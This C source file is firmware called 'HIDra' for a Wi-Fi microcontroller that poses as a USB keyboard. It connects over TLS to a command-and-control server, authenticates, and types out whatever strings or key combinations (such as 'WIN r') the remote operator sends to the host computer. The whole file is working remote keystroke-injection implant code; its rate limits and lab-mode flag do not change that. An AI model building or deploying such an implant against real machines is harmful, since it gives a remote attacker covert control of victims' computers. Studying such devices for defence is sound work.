/* HIDra laboratory firmware: Core 0 network, Core 1 TinyUSB, bounded SPSC queue. */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "pico/critical_section.h"
#include "pico/rand.h"
#include "pico/cyw43_arch.h"
#include "hardware/watchdog.h"
#include "tusb.h"
#include "usb_descriptors.h"
#include "agent_config.h"
#include "protocol.h"
#include "hid_queue.h"
#include "tls_transport.h"
#include "mbedtls/md.h"
#include "mbedtls/sha256.h"

static hid_queue_t queue;
static hidra_tls_t tls;
static absolute_time_t payload_deadline;
static uint32_t payload_generation;
static critical_section_t ring_lock;
static void enter_queue(void *lock) { critical_section_enter_blocking(lock); }
static void leave_queue(void *lock) { critical_section_exit(lock); }
static void cancel_pending(void) { hid_queue_cancel(&queue); }
static bool enqueue_special(uint8_t modifier, uint8_t keycode, uint16_t delay_ms) {
    do {
        if (time_reached(payload_deadline) || tls.eof) return false;
        if (hid_queue_push(&queue, (hid_key_t){modifier, keycode, delay_ms}, payload_generation)) return true;
        if (!hid_queue_active(&queue, payload_generation)) return false;
        hidra_network_poll();
    } while (!time_reached(payload_deadline));
    return false;
}
static hid_key_t ascii_to_hid(char c) {
    /* Letters */
    if (c >= 'a' && c <= 'z') return (hid_key_t){0,    (uint8_t)(HID_KEY_A + c - 'a'), 0};
    if (c >= 'A' && c <= 'Z') return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT,
                                                  (uint8_t)(HID_KEY_A + c - 'A'), 0};
    /* Digits */
    if (c >= '1' && c <= '9') return (hid_key_t){0,    (uint8_t)(HID_KEY_1 + c - '1'), 0};
    if (c == '0')              return (hid_key_t){0,    HID_KEY_0, 0};

    /* Common punctuation (US layout) */
    switch (c) {
    case ' ':  return (hid_key_t){0,                         HID_KEY_SPACE,        0};
    case '\n': return (hid_key_t){0,                         HID_KEY_ENTER,        0};
    case '\t': return (hid_key_t){0,                         HID_KEY_TAB,          0};
    case '-':  return (hid_key_t){0,                         HID_KEY_MINUS,        0};
    case '=':  return (hid_key_t){0,                         HID_KEY_EQUAL,        0};
    case '[':  return (hid_key_t){0,                         HID_KEY_BRACKET_LEFT, 0};
    case ']':  return (hid_key_t){0,                         HID_KEY_BRACKET_RIGHT,0};
    case '\\': return (hid_key_t){0,                         HID_KEY_BACKSLASH,    0};
    case ';':  return (hid_key_t){0,                         HID_KEY_SEMICOLON,    0};
    case '\'': return (hid_key_t){0,                         HID_KEY_APOSTROPHE,   0};
    case '`':  return (hid_key_t){0,                         HID_KEY_GRAVE,        0};
    case ',':  return (hid_key_t){0,                         HID_KEY_COMMA,        0};
    case '.':  return (hid_key_t){0,                         HID_KEY_PERIOD,       0};
    case '/':  return (hid_key_t){0,                         HID_KEY_SLASH,        0};
    /* Shifted punctuation */
    case '!':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_1,          0};
    case '@':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_2,          0};
    case '#':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_3,          0};
    case '$':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_4,          0};
    case '%':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_5,          0};
    case '^':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_6,          0};
    case '&':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_7,          0};
    case '*':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_8,          0};
    case '(':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_9,          0};
    case ')':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_0,          0};
    case '_':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_MINUS,      0};
    case '+':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_EQUAL,      0};
    case '{':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_BRACKET_LEFT,  0};
    case '}':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_BRACKET_RIGHT, 0};
    case '|':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_BACKSLASH,  0};
    case ':':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_SEMICOLON,  0};
    case '"':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_APOSTROPHE, 0};
    case '<':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_COMMA,      0};
    case '>':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_PERIOD,     0};
    case '?':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_SLASH,      0};
    case '~':  return (hid_key_t){KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_GRAVE,      0};
    default:   return (hid_key_t){0, 0, 0};  /* unsupported — skip    */
    }
}


static bool enqueue_string(const char *text) {
    for (; *text; ++text) {
        hid_key_t key = ascii_to_hid(*text);
        if (!key.keycode || !enqueue_special(key.modifier, key.keycode, 20)) return false;
    }
    return true;
}

static void service_hid(hid_queue_t *q, void *unused) {
    (void)unused;
    static bool release;
    static uint64_t ready_at;
    static uint16_t after_release;
    static uint32_t seen_generation;
    bool mounted = tud_mounted() && !tud_suspended();
    if (!mounted && q->enabled) { q->tail = q->head; q->busy = false; ++q->generation; }
    q->enabled = mounted;
    if (seen_generation != q->generation) {
        seen_generation = q->generation;
        release = true; ready_at = 0; after_release = 0; q->busy = true;
    }
    uint64_t now = time_us_64();
    if (!mounted || !tud_hid_ready() || now < ready_at) return;
    if (release) {
        if (tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL)) {
            release = false;
            ready_at = now + (uint64_t)after_release * 1000;
        }
    } else if (q->tail != q->head) {
        hid_key_t key = q->records[q->tail];
        if (!key.keycode && !key.modifier) {
            q->tail = (q->tail + 1) % RING_CAP;
            q->busy = true;
            ready_at = now + (uint64_t)key.delay_ms * 1000;
        } else {
            uint8_t keys[6] = {key.keycode, 0, 0, 0, 0, 0};
            if (tud_hid_keyboard_report(REPORT_ID_KEYBOARD, key.modifier, keys)) {
                q->tail = (q->tail + 1) % RING_CAP;
                release = true; after_release = key.delay_ms; q->busy = true;
                ready_at = now + 8000;
            }
        }
    } else {
        q->busy = false;
    }
}
static void core1_entry(void) {
    tusb_init();
    for (;;) {
        tud_task();
        hid_queue_visit(&queue, service_hid, NULL);
        tight_loop_contents();
    }
}
void tud_hid_report_complete_cb(uint8_t instance, const uint8_t *report, uint16_t length) {
    (void)instance; (void)report; (void)length;
}
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id,
    hid_report_type_t type, uint8_t *buffer, uint16_t length) {
    (void)instance; (void)report_id; (void)type; (void)buffer; (void)length;
    return 0; /* Unsupported request; never return uninitialized memory. */
}
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id,
    hid_report_type_t type, const uint8_t *buffer, uint16_t length) {
    (void)instance; (void)report_id; (void)type; (void)buffer; (void)length;
}

typedef struct { const char *name; uint8_t keycode; } named_key_t;
static const named_key_t named_keys[] = {
    {"ENTER",  HID_KEY_ENTER},    {"ESC",    HID_KEY_ESCAPE},
    {"TAB",    HID_KEY_TAB},      {"SPACE",  HID_KEY_SPACE},
    {"DEL",    HID_KEY_DELETE},   {"BACKSPACE", HID_KEY_BACKSPACE},
    {"HOME",   HID_KEY_HOME},     {"END",    HID_KEY_END},
    {"PGUP",   HID_KEY_PAGE_UP},  {"PGDN",   HID_KEY_PAGE_DOWN},
    {"UP",     HID_KEY_ARROW_UP}, {"DOWN",   HID_KEY_ARROW_DOWN},
    {"LEFT",   HID_KEY_ARROW_LEFT},{"RIGHT", HID_KEY_ARROW_RIGHT},
    {"F1",  HID_KEY_F1},  {"F2",  HID_KEY_F2},  {"F3",  HID_KEY_F3},
    {"F4",  HID_KEY_F4},  {"F5",  HID_KEY_F5},  {"F6",  HID_KEY_F6},
    {"F7",  HID_KEY_F7},  {"F8",  HID_KEY_F8},  {"F9",  HID_KEY_F9},
    {"F10", HID_KEY_F10}, {"F11", HID_KEY_F11}, {"F12", HID_KEY_F12},
    {NULL, 0}
};

/* Parse "WIN r" / "CTRL ALT DEL" / "F5" etc. and enqueue */
static bool enqueue_key_combo(const char *spec) {
    char buf[64]; strncpy(buf, spec, sizeof(buf)-1); buf[sizeof(buf)-1] = '\0';

    uint8_t modifier = 0;
    uint8_t keycode  = 0;
    char   *token    = strtok(buf, " ");

    while (token) {
        /* Modifier tokens */
        if (!strcmp(token,"CTRL") || !strcmp(token,"CONTROL"))
            { modifier |= KEYBOARD_MODIFIER_LEFTCTRL;  token = strtok(NULL," "); continue; }
        if (!strcmp(token,"SHIFT"))
            { modifier |= KEYBOARD_MODIFIER_LEFTSHIFT; token = strtok(NULL," "); continue; }
        if (!strcmp(token,"ALT"))
            { modifier |= KEYBOARD_MODIFIER_LEFTALT;   token = strtok(NULL," "); continue; }
        if (!strcmp(token,"WIN") || !strcmp(token,"GUI"))
            { modifier |= KEYBOARD_MODIFIER_LEFTGUI;   token = strtok(NULL," "); continue; }

        /* Named key */
        bool found = false;
        for (int i = 0; named_keys[i].name; i++) {
            if (!strcmp(token, named_keys[i].name)) {
                keycode = named_keys[i].keycode; found = true; break;
            }
        }
        /* Single-character key */
        if (!found && strlen(token) == 1) {
            hid_key_t k = ascii_to_hid(token[0]);
            keycode   = k.keycode;
            modifier |= k.modifier;
        }
        token = strtok(NULL, " ");
    }

    return keycode && enqueue_special(modifier, keycode, 80);
}


static bool run_payload(const char *action, const char *payload) {
    /* One deadline covers enqueue AND report completion, not 15 seconds per key. */
    payload_deadline = make_timeout_time_ms(15000);
    payload_generation = hid_queue_generation(&queue);
    bool queued;
    if (!strcmp(action, "type")) queued = enqueue_string(payload);
    else if (!strcmp(action, "key")) queued = enqueue_key_combo(payload);
    else queued = enqueue_special(0, 0, (uint16_t)strtoul(payload, NULL, 10));
    if (!queued) return false;
    while (!hid_queue_idle(&queue, payload_generation)) {
        if (time_reached(payload_deadline) || tls.eof || !hid_queue_active(&queue, payload_generation)) return false;
        hidra_network_poll();
    }
    return true;
}
static uint32_t rate_timestamps[30];
static unsigned rate_count;
static char line[HIDRA_MAX_FRAME + 1], body[HIDRA_MAX_BODY + 1], sid[65];
static uint32_t txseq, rxseq;

static bool hmac_callback(void *unused, const char *data, size_t length, char output[65]) {
    (void)unused;
    unsigned char digest[32];
    const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
    if (!info || mbedtls_md_hmac(info, (const unsigned char *)RUNNER_HMAC_SECRET,
        strlen(RUNNER_HMAC_SECRET), (const unsigned char *)data, length, digest) != 0) return false;
    for (unsigned i = 0; i < 32; ++i) snprintf(output + i * 2, 3, "%02x", digest[i]);
    output[64] = 0;
    return true;
}
static bool send_body(const char *message) {
    if (!hidra_encode(sid, txseq, "a2s", message, hmac_callback, NULL, line, sizeof(line)) ||
        !hidra_tls_writeline(&tls, line)) return false;
    ++txseq;
    return true;
}
static bool receive_body(void) {
    if (!hidra_tls_readline(&tls, line, sizeof(line)) ||
        !hidra_decode(sid, rxseq, "s2a", line, hmac_callback, NULL, body, sizeof(body))) return false;
    ++rxseq;
    return true;
}
static bool negotiate(void) {
    hidra_object_t object;
    char challenge[65], nonce[65], material[139];
    unsigned char random[32], digest[32];
    if (!hidra_tls_readline(&tls, line, sizeof(line)) || !hidra_parse(line, &object) ||
        object.count != 1 || !hidra_string(&object, "challenge", challenge, sizeof(challenge)) ||
        !hidra_hex64(challenge) || mbedtls_ctr_drbg_random(&tls.drbg, random, sizeof(random)) != 0) return false;
    for (unsigned i = 0; i < 32; ++i) snprintf(nonce + i * 2, 3, "%02x", random[i]);
    int length = snprintf(material, sizeof(material), "HIDra/2\n%s\n%s", challenge, nonce);
    if (length < 0 || (size_t)length >= sizeof(material) ||
        mbedtls_sha256((const unsigned char *)material, (size_t)length, digest, 0) != 0) return false;
    for (unsigned i = 0; i < 32; ++i) snprintf(sid + i * 2, 3, "%02x", digest[i]);
    snprintf(line, sizeof(line), "{\"nonce\":\"%s\"}", nonce);
    txseq = rxseq = 1;
    return hidra_tls_writeline(&tls, line);
}
/* 0 = retry transport, 1 = clean exit or rejected authentication, 2 = reboot. */
static int run_session(void) {
    int outcome = 0;
    hidra_tls_init(&tls);
    if (!hidra_tls_connect(&tls, C2_ADDRESS, C2_HOST, C2_PORT) || !negotiate()) goto cleanup;
    char quoted_token[768];
    if (!hidra_quote(RUNNER_TOKEN, quoted_token, sizeof(quoted_token))) goto cleanup;
    int length = snprintf(body, sizeof(body), "{\"action\":\"auth\",\"token\":%s}", quoted_token);
    if (length < 0 || (size_t)length >= sizeof(body) || !send_body(body) || !receive_body()) goto cleanup;
    hidra_object_t ack;
    char action[16], payload[257];
    if (!hidra_parse(body, &ack) || ack.count != 2 || !hidra_true(&ack, "ok") ||
        !hidra_string(&ack, "action", action, sizeof(action)) || strcmp(action, "ok")) {
        outcome = 1; goto cleanup;
    }
    printf("[C2] authenticated (protocol v2)\n");
    while (receive_body()) {
        if (!hidra_command(body, action, payload)) {
            if (!send_body("{\"ok\":false,\"error\":\"invalid command\"}")) break;
        } else if (!strcmp(action, "ping")) {
            if (!send_body("{\"ok\":true,\"action\":\"pong\"}")) break;
        } else if (!strcmp(action, "exit") || !strcmp(action, "terminate")) {
            cancel_pending();
            if (send_body("{\"ok\":true}")) outcome = !strcmp(action, "exit") ? 1 : 2;
            break;
        } else if (!hidra_rate_allow(to_ms_since_boot(get_absolute_time()), rate_timestamps, &rate_count)) {
            if (!send_body("{\"ok\":false,\"error\":\"rate limit exceeded\"}")) break;
        } else if (!run_payload(action, payload)) {
            cancel_pending();
            (void)send_body("{\"ok\":false,\"error\":\"HID unavailable or queue timeout\"}");
            break; /* Partial emission cannot be rolled back; never retry automatically. */
        } else if (!send_body("{\"ok\":true}")) break;
    }
cleanup:
    cancel_pending();
    hidra_tls_free(&tls);
    return outcome;
}
static bool valid_secret(const char *value) {
    size_t n = strlen(value);
    if (n < 32 || n > 127 || !strncmp(value, "change_me", 9) || !strncmp(value, "your_", 5)) return false;
    for (size_t i = 0; i < n; ++i) if (value[i] < 33 || value[i] > 126) return false;
    return true;
}
int main(void) {
    stdio_init_all();
    printf("[BOOT] HIDra protocol v2; physical operation unvalidated\n");
#if AGENT_LAB_MODE
    printf("[WARN] LAB MODE: server certificate verification disabled\n");
#endif
    if (!valid_secret(RUNNER_TOKEN) || !valid_secret(RUNNER_HMAC_SECRET) ||
        !strcmp(RUNNER_TOKEN, RUNNER_HMAC_SECRET)) return 1;
    critical_section_init(&ring_lock);
    hid_queue_init(&queue, enter_queue, leave_queue, &ring_lock);
    multicore_launch_core1(core1_entry);
    if (cyw43_arch_init()) return 1;
    cyw43_arch_enable_sta_mode();
    unsigned attempt = 0;
    for (;;) {
        int status = cyw43_tcpip_link_status(&cyw43_state, CYW43_ITF_STA);
        if (status != CYW43_LINK_UP && cyw43_arch_wifi_connect_timeout_ms(
            WIFI_SSID, WIFI_PASS, CYW43_AUTH_WPA2_AES_PSK, 30000) != 0) {
            printf("[WiFi] connection failed\n");
        } else {
            int outcome = run_session();
            if (outcome) {
                if (outcome == 2) watchdog_reboot(0, 0, 0);
                cyw43_arch_deinit();
                for (;;) sleep_ms(1000); /* USB keeps servicing release; explicit exit does not reconnect. */
            }
        }
        unsigned base = attempt < 6 ? 1000u << attempt : 60000u;
        if (base > 60000) base = 60000;
        unsigned delay = base * 4 / 5 + get_rand_32() % (base * 2 / 5 + 1);
        if (delay > 60000) delay = 60000;
        if (delay < 1000) delay = 1000;
        if (attempt < 6) ++attempt;
        absolute_time_t until = make_timeout_time_ms(delay);
        while (!time_reached(until)) hidra_network_poll();
    }
}
